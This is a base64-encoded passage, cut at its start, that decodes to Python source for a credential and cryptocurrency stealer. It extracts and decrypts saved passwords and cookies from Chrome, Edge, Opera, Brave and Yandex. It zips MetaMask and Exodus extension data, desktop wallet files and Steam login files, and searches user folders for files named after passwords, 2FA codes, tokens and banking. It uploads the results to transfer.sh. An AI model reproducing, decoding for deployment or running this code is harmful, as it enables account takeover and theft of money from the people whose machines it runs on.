W5kKG9sZCkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgQ29va2llcy5hcHBlbmQoZiJ7cm93WzBdfQlUUlVFIisiCQkiKyBmIi9GQUxTRQkyNTk3NTczNDU2CXtyb3dbMV19CXtEZWNyeXB0VmFsdWUocm93WzJdLCBtYXN0ZXJfa2V5KX0iKQogICAgICAgICAgICAKICAgIHdyaXRlZm9yZmlsZShDb29raWVzLCAnYmNfYWxsY29va2llcycpCgpkZWYgY2hlY2tJZlByb2Nlc3NSdW5uaW5nKHByb2Nlc3NOYW1lKToKICAgICcnJwogICAgQ2hlY2sgaWYgdGhlcmUgaXMgYW55IHJ1bm5pbmcgcHJvY2VzcyB0aGF0IGNvbnRhaW5zIHRoZSBnaXZlbiBuYW1lIHByb2Nlc3NOYW1lLgogICAgJycnCiAgICAjSXRlcmF0ZSBvdmVyIHRoZSBhbGwgdGhlIHJ1bm5pbmcgcHJvY2VzcwogICAgZm9yIHByb2MgaW4gcHN1dGlsLnByb2Nlc3NfaXRlcigpOgogICAgICAgIHRyeToKICAgICAgICAgICAgIyBDaGVjayBpZiBwcm9jZXNzIG5hbWUgY29udGFpbnMgdGhlIGdpdmVuIG5hbWUgc3RyaW5nLgogICAgICAgICAgICBpZiBwcm9jZXNzTmFtZS5sb3dlcigpIGluIHByb2MubmFtZSgpLmxvd2VyKCk6CiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZQogICAgICAgIGV4Y2VwdCAocHN1dGlsLk5vU3VjaFByb2Nlc3MsIHBzdXRpbC5BY2Nlc3NEZW5pZWQsIHBzdXRpbC5ab21iaWVQcm9jZXNzKToKICAgICAgICAgICAgcGFzcwogICAgcmV0dXJuIEZhbHNlOwoKCmRlZiBaaXBUaGluZ3MocGF0aCwgYXJnLCBwcm9jYyk6CiAgICBwYXRoQyA9IHBhdGgKICAgIG5hbWUgPSBhcmcKICAgIGlmICJhaG9scGZkaWFsamdqZmhvbWloa2pibWdqaWRsY2RubyIgaW4gYXJnOgogICAgICAgIGJyb3dzZXIgPSBwYXRoLnNwbGl0KCJcXCIpWzRdLnNwbGl0KCIvIilbMV0ucmVwbGFjZSgnICcsICcnKQogICAgICAgIG5hbWUgPSBmIkV4b2R1c197YnJvd3Nlcn0iCiAgICAgICAgcGF0aEMgPSBwYXRoICsgYXJnCgogICAgaWYgIm5rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiBpbiBhcmc6CiAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCcgJywgJycpCiAgICAgICAgbmFtZSA9IGYiTWV0YW1hc2tfe2Jyb3dzZXJ9IgogICAgICAgIHBhdGhDID0gcGF0aCArIGFyZwoKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoQyk6IHJldHVybgogICAgaWYgY2hlY2tJZlByb2Nlc3NSdW5uaW5nKCdjaHJvbWUuZXhlJyk6CiAgICAgICAgcHJpbnQoJ1llcyBhIGNocm9tZSBwcm9jZXNzIHdhcyBydW5uaW5nJykKICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YiLCBzaGVsbD1UcnVlKQogICAgZWxzZToKICAgICAgICAuLi4KICAgICAgICAKCiAgICBpZiAiV2FsbGV0IiBpbiBhcmcgb3IgIk5hdGlvbnNHbG9yeSIgaW4gYXJnOgogICAgICAgIGJyb3dzZXIgPSBwYXRoLnNwbGl0KCJcXCIpWzRdLnNwbGl0KCIvIilbMV0ucmVwbGFjZSgnICcsICcnKQogICAgICAgIG5hbWUgPSBmInticm93c2VyfSIKCiAgICBlbGlmICJTdGVhbSIgaW4gYXJnOgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShmIntwYXRoQ30vbG9naW51c2Vycy52ZGYiKTogcmV0dXJuCiAgICAgICAgZiA9IG9wZW4oZiJ7cGF0aEN9L2xvZ2ludXNlcnMudmRmIiwgInIrIiwgZW5jb2Rpbmc9InV0ZjgiKQogICAgICAgIGRhdGEgPSBmLnJlYWRsaW5lcygpCiAgICAgICAgZm91bmQgPSBGYWxzZQogICAgICAgIGZvciBsIGluIGRhdGE6CiAgICAgICAgICAgIGlmICdSZW1lbWJlclBhc3N3b3JkIlx0XHQiMSInIGluIGw6CiAgICAgICAgICAgICAgICBmb3VuZCA9IFRydWUKICAgICAgICBpZiBmb3VuZCA9PSBGYWxzZTogcmV0dXJuCiAgICAgICAgbmFtZSA9IGFyZwoKICAgIHpmID0gemlwZmlsZS5aaXBGaWxlKGYie3BhdGhDfS97bmFtZX0uemlwIiwgInciKQogICAgcHJpbnQoemYpCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGhDKToKICAgICAgICBpZiBub3QgIi56aXAiIGluIGZpbGU6IHpmLndyaXRlKHBhdGhDICsgIi8iICsgZmlsZSkKICAgIHpmLmNsb3NlKCkKCiAgICB1cGxvYWQoZid7cGF0aEN9L3tuYW1lfS56aXAnKQogICAgb3MucmVtb3ZlKGYie3BhdGhDfS97bmFtZX0uemlwIikKCgpkZWYgZ3JhYmJfR2F0aGVyQWxsKCk6CiAgICAnICAgICAgICAgICAgICAgICAgIERlZmF1bHQgUGF0aCA8IDAgPiAgICAgICAgICAgICAgICAgICAgICAgICBQcm9jZXNOYW1lIDwgMSA+ICAgICAgICBUb2tlbiAgPCAyID4gICAgICAgICAgICAgIFBhc3N3b3JkIDwgMyA+ICAgICBDb29raWVzIDwgNCA+ICAgICAgICAgICAgICAgICAgICAgICAgICBFeHRlbnRpb25zIDwgNSA+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICcKICAgIGJyb3dzZXJQYXRocyA9IFsKICAgICAgICBbZiJ7cm9hbWluZ30vT3BlcmEgU29mdHdhcmUvT3BlcmEgR1ggU3RhYmxlIiwgICAgICAgICAgICAgICAib3BlcmEuZXhlIiwgICAgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICAgICAgICAgIi8iLCAgICAgICAgICAgICIvTmV0d29yayIsICAgICAgICAgICAgICIvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGUiLCAgICAgICAgICAgICAgICAgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie3JvYW1pbmd9L09wZXJhIFNvZnR3YXJlL09wZXJhIE5lb24vVXNlciBEYXRhL0RlZmF1bHQiLCAgIm9wZXJhLmV4ZSIsICAgICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAgICAgICAgICIvIiwgICAgICAgICAgICAiL05ldHdvcmsiLCAgICAgICAgICAgICAiL0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7bG9jYWx9L0dvb2dsZS9DaHJvbWUvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICAgICAgICAiY2hyb21lLmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vR29vZ2xlL0Nocm9tZSBTeFMvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICAgICJjaHJvbWUuZXhlIiwgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie2xvY2FsfS9CcmF2ZVNvZnR3YXJlL0JyYXZlLUJyb3dzZXIvVXNlciBEYXRhIiwgICAgICAgICAgImJyYXZlLmV4ZSIsICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdCIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7bG9jYWx9L1lhbmRleC9ZYW5kZXhCcm93c2VyL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAieWFuZGV4LmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvSG91Z2FCb3VnYS9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vTWljcm9zb2Z0L0VkZ2UvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICAgICAgICJlZGdlLmV4ZSIsICAgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgIF0KICAgIF0KCgoKICAgIFBhdGhzX3ppcHBlZCA9IFsKICAgICAgICBbZiJ7cm9hbWluZ30vYXRvbWljL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICciQXRvbWljIFdhbGxldC5leGUiJywgIldhbGxldCJdLAogICAgICAgIFtmIntyb2FtaW5nfS9FeG9kdXMvZXhvZHVzLndhbGxldCIsICJFeG9kdXMuZXhlIiwgIldhbGxldCJdLAogICAgICAgIFsiQzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxTdGVhbVxjb25maWciLCAic3RlYW0uZXhlIiwgIlN0ZWFtIl0sCiAgICAgICAgW2Yie3JvYW1pbmd9L05hdGlvbnNHbG9yeS9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAiTmF0aW9uc0dsb3J5LmV4ZSIsICJOYXRpb25zR2xvcnkiXQogICAgXQoKCiAgICBmb3IgcGF0dCBpbiBicm93c2VyUGF0aHM6CiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWdldFBhc3N3LCBhcmdzPVtwYXR0WzBdLCBwYXR0WzNdXSkKICAgICAgICBhLnN0YXJ0KCkKICAgICAgICBUaHJlYWRsaXN0LmFwcGVuZChhKQoKICAgIHRocmVhZF9iY2Nvb2tpZXMgPSBbXQogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOgogICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1nZXRDb29raWUsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbNF1dKQogICAgICAgIGEuc3RhcnQoKQogICAgICAgIHRocmVhZF9iY2Nvb2tpZXMuYXBwZW5kKGEpCgogICAgZm9yIHRocmVhZCBpbiB0aHJlYWRfYmNjb29raWVzOiB0aHJlYWQuam9pbigpCiAgICBERVRFQ1RFRCA9IFRydXN0KENvb2tpZXMpCiAgICBpZiBERVRFQ1RFRCA9PSBUcnVlOiByZXR1cm4KCiAgICBmb3IgcGF0dCBpbiBicm93c2VyUGF0aHM6CiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WmlwVGhpbmdzLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzVdLCBwYXR0WzFdXSkuc3RhcnQoKQoKICAgIGZvciBwYXR0IGluIFBhdGhzX3ppcHBlZDoKICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbMl0sIHBhdHRbMV1dKS5zdGFydCgpCgogICAgZm9yIHRocmVhZCBpbiBUaHJlYWRsaXN0OgogICAgICAgIHRocmVhZC5qb2luKCkKICAgIGdsb2JhbCB1cHRocwogICAgdXB0aHMgPSBbXQoKICAgIGZvciBmaWxlIGluIFsiYmNfYWxscGFzc3dvcmRzLnR4dCIsICJiY19hbGxjb29raWVzLnR4dCJdOgogICAgICAgIHVwbG9hZChvcy5nZXRlbnYoIlRFTVAiKSArICJcXCIgKyBmaWxlKQoKCmRlZiBiY191cGxvYWRhbm9uZmlsZXMocGF0aCk6CiAgICB0cnk6CgogICAgICAgIGZpbGVzID0geyAiZmlsZSI6IChwYXRoLCBvcGVuKHBhdGgsIG1vZGU9J3JiJykpIH0KICAgICAgICAuLi4KICAgICAgICB1cGxvYWQgPSByZXF1ZXN0cy5wb3N0KCJodHRwczovL3RyYW5zZmVyLnNoLyIsIGZpbGVzPWZpbGVzKQogICAgICAgIHVybCA9IHVwbG9hZC50ZXh0CiAgICAgICAgcmV0dXJuIHVybAogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKZGVmIGJjX0ZvbGRlcl9jcmVhdGUocGF0aEYsIGtleXdvcmRzKToKICAgIGdsb2JhbCBiY19jcmVhdGVfZmlsZXMKICAgIG1heGZpbGVzcGVyZGlyID0gNwogICAgaSA9IDAKICAgIGxpc3RPZkZpbGUgPSBvcy5saXN0ZGlyKHBhdGhGKQogICAgZmZvdW5kID0gW10KICAgIGZvciBmaWxlIGluIGxpc3RPZkZpbGU6CiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKHBhdGhGICsgIi8iICsgZmlsZSk6IHJldHVybgogICAgICAgIGkgKz0gMQogICAgICAgIGlmIGkgPD0gbWF4ZmlsZXNwZXJkaXI6CiAgICAgICAgICAgIHVybCA9IGJjX3VwbG9hZGFub25maWxlcyhwYXRoRiArICIvIiArIGZpbGUpCiAgICAgICAgICAgIGZmb3VuZC5hcHBlbmQoW3BhdGhGICsgIi8iICsgZmlsZSwgdXJsXSkKICAgICAgICBlbHNlOgogICAgICAgICAgICBicmVhawogICAgYmNfY3JlYXRlX2ZpbGVzLmFwcGVuZChbImZvbGRlciIsIHBhdGhGICsgIi8iLCBmZm91bmRdKQoKYmNfY3JlYXRlX2ZpbGVzID0gW10KZGVmIGJjX2NyZWF0ZV9maWxlKHBhdGgsIGtleXdvcmRzKToKICAgIGdsb2JhbCBiY19jcmVhdGVfZmlsZXMKICAgIGZpZm91bmQgPSBbXQogICAgbGlzdE9mRmlsZSA9IG9zLmxpc3RkaXIocGF0aCkKICAgIGZvciBmaWxlIGluIGxpc3RPZkZpbGU6CiAgICAgICAgZm9yIHdvcmYgaW4ga2V5d29yZHM6CiAgICAgICAgICAgIGlmIHdvcmYgaW4gZmlsZS5sb3dlcigpOgogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5pc2ZpbGUocGF0aCArICIvIiArIGZpbGUpIGFuZCAiLnR4dCIgaW4gZmlsZToKICAgICAgICAgICAgICAgICAgICBmaWZvdW5kLmFwcGVuZChbcGF0aCArICIvIiArIGZpbGUsIGJjX3VwbG9hZGFub25maWxlcyhwYXRoICsgIi8iICsgZmlsZSldKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZGlyKHBhdGggKyAiLyIgKyBmaWxlKToKICAgICAgICAgICAgICAgICAgICB0YXJnZXQgPSBwYXRoICsgIi8iICsgZmlsZQogICAgICAgICAgICAgICAgICAgIGJjX0ZvbGRlcl9jcmVhdGUodGFyZ2V0LCBrZXl3b3JkcykKICAgICAgICAgICAgICAgICAgICBicmVhawoKICAgIGJjX2NyZWF0ZV9maWxlcy5hcHBlbmQoWyJmb2xkZXIiLCBwYXRoLCBmaWZvdW5kXSkKCmRlZiBiY19jaGVja2luZygpOgogICAgdXNlciA9IHRlbXAuc3BsaXQoIlxBcHBEYXRhIilbMF0KICAgIHBhdGgyc2VhcmNoID0gWwogICAgICAgIHVzZXIgKyAiL0Rlc2t0b3AiLAogICAgICAgIHVzZXIgKyAiL0Rvd25sb2FkcyIsCiAgICAgICAgdXNlciArICIvRG9jdW1lbnRzIgogICAgXQoKCgogICAga2V5X3dvcmRzRmlsZXMgPSBbCiAgICAgICAgInBhc3N3IiwKICAgICAgICAibWRwIiwKICAgICAgICAibW90ZGVwYXNzZSIsCiAgICAgICAgIm1vdF9kZV9wYXNzZSIsCiAgICAgICAgImxvZ2luIiwKICAgICAgICAic2VjcmV0IiwKICAgICAgICAiYWNjb3VudCIsCiAgICAgICAgImFjb3VudCIsCiAgICAgICAgInBheXBhbCIsCiAgICAgICAgImJhbnF1ZSIsCiAgICAgICAgIm1ldGFtYXNrIiwKICAgICAgICAid2FsbGV0IiwKICAgICAgICAiY3J5cHRvIiwKICAgICAgICAiZXhvZHVzIiwKICAgICAgICAiZGlzY29yZCIsCiAgICAgICAgIjJmYSIsCiAgICAgICAgImNvZGUiLAogICAgICAgICJtZW1vIiwKICAgICAgICAiY29tcHRlIiwKICAgICAgICAidG9rZW4iLAogICAgICAgICJiYWNrdXAiLAogICAgICAgICJzZWVjcmV0IgogICAgICAgIF0KCiAgICB3aWtpdGggPSBbXQogICAgZm9yIHBhdHQgaW4gcGF0aDJzZWFyY2g6CiAgICAgICAgYmNfY2hlY2tpbmcgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1iY19jcmVhdGVfZmlsZSwgYXJncz1bcGF0dCwga2V5X3dvcmRzRmlsZXNdKTtiY19jaGVja2luZy5zdGFydCgpCiAgICAgICAgd2lraXRoLmFwcGVuZChiY19jaGVja2luZykKICAgIHJldHVybiB3aWtpdGgKCgpnbG9iYWwga2V5d29yZCwgY29va2lXb3JkcywgcGFzd1dvcmRzCgprZXl3b3JkID0gWwogICAgJ21haWwnLCAnW2NvaW5iYXNlXShodHRwczovL2NvaW5iYXNlLmNvbSknLCAnW3NlbGxpeF0oaHR0cHM6Ly9zZWxsaXguaW8pJywgJ1tnbWFpbF0oaHR0cHM6Ly9nbWFpbC5jb20pJywgJ1tzdGVhbV0oaHR0cHM6Ly9zdGVhbS5jb20pJywgJ1tkaXNjb3JkXShodHRwczovL2Rpc2NvcmQuY29tKScsICdbcmlvdGdhbWVzXShodHRwczovL3Jpb3RnYW1lcy5jb20pJywgJ1t5b3V0dWJlXShodHRwczovL3lvdXR1YmUuY29tKScsICdbaW5zdGFncmFtXShodHRwczovL2luc3RhZ3JhbS5jb20pJywgJ1t0aWt0b2tdKGh0dHBzOi8vdGlrdG9rLmNvbSknLCAnW3R3aXR0ZXJdKGh0dHBzOi8vdHdpdHRlci5jb20pJywgJ1tmYWNlYm9va10oaHR0cHM6Ly9mYWNlYm9vay5jb20pJywgJ2NhcmQnLCAnW2VwaWNnYW1lc10oaHR0cHM6Ly9lcGljZ2FtZXMuY29tKScsICdbc3BvdGlmeV0oaHR0cHM6Ly9zcG90aWZ5LmNvbSknLCAnW3lhaG9vXShodHRwczovL3lhaG9vLmNvbSknLCAnW3JvYmxveF0oaHR0cHM6Ly9yb2Jsb3guY29tKScsICdbdHdpdGNoXShodHRwczovL3R3aXRjaC5jb20pJywgJ1ttaW5lY3JhZnRdKGh0dHBzOi8vbWluZWNyYWZ0Lm5ldCknLCAnYmFuaycsICdbcGF5cGFsXShodHRwczovL3BheXBhbC5jb20pJywgJ1tvcmlnaW5dKGh0dHBzOi8vb3JpZ2luLmNvbSknLCAnW2FtYXpvbl0oaHR0cHM6Ly9hbWF6b24uY29tKScsICdbZWJheV0oaHR0cHM6Ly9lYmF5LmNvbSknLCAnW2FsaWV4cHJlc3NdKGh0dHBzOi8vYWxpZXhwcmVzcy5jb20pJywgJ1twbGF5c3RhdGlvbl0oaHR0cHM6Ly9wbGF5c3RhdGlvbi5jb20pJywgJ1toYm9dKGh0dHBzOi8vaGJvLmNvbSknLCAnW3hib3hdKGh0dHBzOi8veGJveC5jb20pJywgJ2J1eScsICdzZWxsJywgJ1tiaW5hbmNlXShodHRwczovL2JpbmFuY2UuY29tKScsICdbaG90bWFpbF0oaHR0cHM6Ly9ob3RtYWlsLmNvbSknLCAnW291dGxvb2tdKGh0dHBzOi8vb3V0bG9vay5jb20pJywgJ1tjcnVuY2h5cm9sbF0oaHR0cHM6Ly9jcnVuY2h5cm9sbC5jb20pJywgJ1t0ZWxlZ3JhbV0oaHR0cHM6Ly90ZWxlZ3JhbS5jb20pJywgJ1twb3JuaHViXShodHRwczovL3Bvcm5odWIuY29tKScsICdbZGlzbmV5XShodHRwczovL2Rpc25leS5jb20pJywgJ1tleHByZXNzdnBuXShodHRwczovL2V4cHJlc3N2cG4uY29tKScsICdjcnlwdG8nLCAnW3ViZXJdKGh0dHBzOi8vdWJlci5jb20pJywgJ1tuZXRmbGl4XShodHRwczovL25ldGZsaXguY29tKScKXQoKCmNvb2tpV29yZHMgPSBbXQpwYXN3V29yZHMgPSBbXQoKZ3JhYmJfR2F0aGVyQWxsKCkKREVURUNURUQgPSBUcnVzdChDb29raWVzKQoKaWYgbm90IERFVEVDVEVEOgogICAgd2lraXRoID0gYmNfY2hlY2tpbmcoKQoKICAgIGZvciB0aHJlYWQgaW4gd2lraXRoOiB0aHJlYWQuam9pbigpCiAgICB0aW1lLnNsZWVwKDAuMikKCiAgICBmaWxldGV4dCA9ICJgYGBkaWZmXG4iCiAgICBmb3IgYXJnIGluIGJjX2NyZWF0ZV9maWxlczoKICAgICAgICBpZiBsZW4oYXJnWzJdKSAhPSAwOgogICAgICAgICAgICBmb2xkcGF0aCA9IGFyZ1sxXQogICAgICAgICAgICBmb2xkbGlzdCA9IGFyZ1syXQogICAgICAgICAgICBmaWxldGV4dCArPWYiXG4iCiAgICAgICAgICAgIGZpbGV0ZXh0ICs9IGYiLSB7Zm9sZHBhdGh9XG4iCgogICAgICAgICAgICBmb3IgZmZpbCBpbiBmb2xkbGlzdDoKICAgICAgICAgICAgICAgIGEgPSBmZmlsWzBdLnNwbGl0KCIvIikKICAgICAgICAgICAgICAgIGZpbGVhbm1lID0gYVtsZW4oYSktMV0KICAgICAgICAgICAgICAgIGIgPSBmZmlsWzFdCiAgICAgICAgICAgICAgICBmaWxldGV4dCArPSBmIisgTmFtZToge2ZpbGVhbm1lfVxuKyBMaW5rOiB7Yn0iCiAgICAgICAgICAgICAgICBmaWxldGV4dCArPSAiXG4iCiAgICBmaWxldGV4dCArPSAiXG5gYGAiCgoKICAgIHVwbG9hZCgiYmNfY2hlY2tpbmciLCBmaWxldGV4dCkKICAgIGF1dG8gPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1hdXRvX2NvcHlfd2FsbGV0KCkucnVuKQogICAgYXV0by5zdGFydCgp
